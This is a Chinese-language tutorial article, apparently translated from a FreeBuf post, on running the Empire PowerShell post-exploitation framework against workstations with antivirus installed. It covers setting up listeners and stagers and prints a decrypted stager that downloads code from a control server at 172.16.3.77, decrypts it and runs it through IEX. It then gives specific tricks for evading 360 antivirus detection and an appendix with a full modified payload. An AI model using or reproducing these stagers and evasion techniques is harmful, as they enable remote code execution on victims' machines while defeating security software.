**由于最近对Red-Blue Team Operations的研究，我对各种后期开发框架产生了兴趣。自从Windows 7和Windows
10中默认发布PowerShell的广泛采用以来，它已经成为笔测试者和红队的热门选择。以下文章将介绍一个名为Empire（<https://github.com/EmpireProject/Empire>）的流行框架，其中包含3000多颗星，以及如何在安装了AV的典型工作站上使用它。**

## 安装

Empire的安装非常简单。您可以选择docker方法，或将其安装在主机实例上。有关主机实例的安装步骤，请按照以下命令操作：

    
    
    git clone https://github.com/EmpireProject/Empire
    cd Empire && sudo ./setup/install.sh
    

在Debian-flavor环境中，安装通常包含apt-update并添加一些apt-source。请耐心等待。以下步骤均基于Ubuntu
16.04.1。某些Windows编译是在带有Visual Stuido的Windows Server 2016上完成的

## 运行

转到Empire的安装目录并输入`sudo ./empire`以开始使用。

![1.png](https://image.3001.net/images/20190516/1557980744_5cdce648c99eb.png!small)

## 监听器

目前支持的监听器`Empire`

    
    
    (Empire: listeners) > uselistener
    dbx http_com http_hop meterpreter redirector 
    http http_foreign http_mapi onedrive 
    (Empire: listeners) > uselistener http
    (Empire: listeners/http) > ?
    Listener Commands
    =================
    agents Jump to the agents menu.
    back Go back a menu.
    creds Display/return credentials from the database.
    execute Execute the given listener module.
    exit Exit Empire.
    help Displays the help menu.
    info Display listener module options.
    launcher Generate an initial launcher for this listener.
    listeners Jump to the listeners menu.
    main Go back to the main menu.
    resource Read and execute a list of Empire commands from a file.
    set Set a listener option.
    unset Unset a listener option.
    (Empire: listeners/http) > info
    Name: HTTP[S]
    Category: client_server
    Authors:
    @harmj0y
    Description:
    Starts a http[s] listener (PowerShell or Python) that uses a
    GET/POST approach.
    HTTP[S] Options:
    Name Required Value Description
    ---- -------- ------- -----------    SlackToken False Your SlackBot API token to communicate with your Slack instance.
    ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
    KillDate False Date for the listener to exit (MM/dd/yyyy).
    Name True http Name for the listener.
    Launcher True powershell -noP -sta -w 1 -enc Launcher string.
    DefaultDelay True 5 Agent delay/reach back interval (in seconds).
    DefaultLostLimit True 60 Number of missed checkins before exiting
    WorkingHours False Hours for the agent to operate (09:00-17:00).
    SlackChannel False #general The Slack channel or DM that notifications will be sent to.
    DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent.
    process.php|Mozilla/5.0 (Windows
    NT 6.1; WOW64; Trident/7.0;
    rv:11.0) like Gecko
    Host True http://172.16.3.77:80 Hostname/IP for staging.
    CertPath False Certificate path for https listeners.
    DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0).
    Proxy False default Proxy to use for request (default, none, or other).
    UserAgent False default User-agent string to use for the staging request (default, none, or other).
    StagingKey True JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7 Staging key for initial agent negotiation.
    BindIP True 0.0.0.0 The IP to bind to on the control server.
    Port True 80 Port for the listener.
    ServerVersion True Microsoft-IIS/7.5 Server header for the control server.
    StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php
    

为了保持对各种网络流量监控的隐秘性，建议使用基于http的侦听器，因为它只会显示为正常的http流量。http-base侦听器所需的选项是 `Host,
Name and Port`

    
    
    (Empire: listeners/http) > set Name http1
    (Empire: listeners/http) > set Port 81
    (Empire: listeners/http) > execute
    [*] Starting listener 'http1'
    [+] Listener successfully started!
    

例如，http侦听器的流量可能如下所示：

    
    
    (Empire) > listeners
    [*] Active listeners:
    Name Module Host Delay/Jitter KillDate
    ---- ------ ---- ------------ --------    http http http://172.16.x.x:80 5/0.0
    

## Stagers

在我们创建一个监听器之后，我们需要一些东西来包装连接，名为stager。`Empire`为不同的平台提供不同的Stagers。最简单的stager是Windows上的直接powershell命令：

    
    
    (Empire: listeners) > launcher powershell http
    powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBlAFIAUwBpAG8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBlAEYAXQAuAEEAcwBTAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlA(omitted)
    

这是所有其他payload的核心。如果您感到好奇，可以直接将其粘贴到命令提示符中进行测试。在其他平台上，类似的逻辑是用Python实现的。

    
    
    (Empire: listeners) > usestager 
    multi/bash osx/dylib windows/backdoorLnkMacro windows/launcher_sct
    multi/launcher osx/jar windows/bunny windows/launcher_vbs
    multi/macro osx/launcher windows/csharp_exe windows/launcher_xml
    multi/pyinstaller osx/macho windows/dll windows/macro
    multi/war osx/macro windows/ducky windows/macroless_msword
    osx/applescript osx/pkg windows/hta windows/shellcode
    osx/application osx/safari_launcher windows/launcher_bat windows/teensy
    osx/ducky osx/teensy windows/launcher_lnk
    

Empire目前支持上面列出的Stagers。您可以测试不同的Windows舞台。选择stager时，使用选项填写必需属性。示例如下：

    
    
    (Empire: listeners) > usestager multi/pyinstaller
    (Empire: stager/multi/pyinstaller) > options
    Name: pyInstaller Launcher
    Description:
    Generates an ELF binary payload launcher for
    Empire using pyInstaller.
    Options:
    Name Required Value Description
    ---- -------- ------- -----------    Language True python Language of the stager to generate.
    SafeChecks True True Switch. Checks for LittleSnitch or a
    SandBox, exit the staging process if
    true. Defaults to True.
    Base64 True False Switch. Base64 encode the output.
    Defaults to False.
    Listener True Listener to generate stager for.
    UserAgent False default User-agent string to use for the staging
    request (default, none, or other).
    BinaryFile True /tmp/empire File to output launcher to.
    (Empire: stager/multi/pyinstaller) > set Listener http1
    (Empire: stager/multi/pyinstaller) > execute
    

## 样本payload分析

现在让我们对Empire生成的启动器metasploit脚本进行简要介绍。第一个IF脚本块是禁用PowerShell日志记录以绕过Windows
Defenders分析的技巧，这在国外非常流行。我在这里不会详细说明，你可以参考引文文件。Windows使用语句检测方法，而一些国内AV将进一步直接阻止PowerShell，如果找到某些关键字。

    
    
    [SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;
    $WC=NEW-OBjECT SYstem.NeT.WEBCliENt;
    $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; 
    $WC.HeAdErS.Add('User-Agent',$u); 
    $WC.PRoxY=[SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;
    $WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;
    $Script:Proxy = $wc.Proxy;
    $K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');
    $R={
    $D,$K=$ArgS;
    $S=0..255; 
    0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{
    $I=($I+1)%256; 
    $H=($H+$S[$I])%256; 
    $S[$I],$S[$H]=$S[$H],$S[$I]; 
    $_-bXoR$S[($S[$I]+$S[$H])%256]
    } };
    $ser='http://172.16.x.x:80';$t='/news.php';$Wc.HEaDERs.ADd('Cookie','session=4L4ZezFDPx');
    $dAta=$WC.DowNlOaDDaATa($sEr+$T);$IV=$dATA[0..3]; 
    $DATA=$data[4..$DAtA.LeNgTh];
    -joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"
    

后面的块是功能块。首先，脚本尝试建立与控制服务器的HTTP连接。从响应数据（前四个字节）中检索IV。稍后将使用硬编码密钥来解密函数体。请注意，该块定义了一个`$R`类似于lambda函数的变量。在最后一行，`$data`并`$IV+$K`传递给lambda作为`$D`，`$K`。解密结果char数组被连接并传递给`IEX`，即`Invoke-Expression`

# 样本模块

Empire附带了一些非常有用的模块，其中有界mimikatz模块可用于提取密码和散列令牌，而权限提升模块可用于将权限提升为本地管理员甚至域管理员。

## bypass AV

### 360

当您直接将payload粘贴到cmd时，它很容易被阻止，提示“powershell.exe正在尝试执行”。除了进程监控，我相信360还使用脚本关键字检测来减少误报。但是，由于powershell是一种非常灵活的语言，因此过滤所有恶意请求并不容易。通过二进制搜索，我们推导出了关键字1.`-enc`powershell参数中的命令行。例如，`powershell
-enc aaa`将被360阻止。2.`downloadData`
在powershell脚本中将被360检测并阻止。3.声明不允许有两个或更多加号。例如`$a+$b;$b+$c`将被360阻止。所有这些方法都有一些方法可以绕过。1.对于第一个，您只需简单地删除enc命令参数即可2.对于第二个，请注意我们可以在powershell中使用string作为方法节点。即`$c="downl"+"oadData";$a.$c.invoke($bla)`3.对于第三个要求，我们可以简单地使用
`$a-(-$b);$b-(-$c)`

## 附录

### 完整的PowerShell代码绕过360

    
    
    "[SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;$WC=NEW-OBjECT SYstem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)
    like Gecko';$WC.HeAdErS.Add('User-Agent',$u);$WC.PRoxY= [SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;$WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;$Script:Proxy = $wc.Proxy;$K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');$R= {$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J-(-$S[$_])- (-$K[$_%$K.CoUnt]))%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H= ($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_- bXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://172.16.3.77:80';$t='/news.php';$Wc.HEaDERs.AD joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"
    

***参考来源：flanker017，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

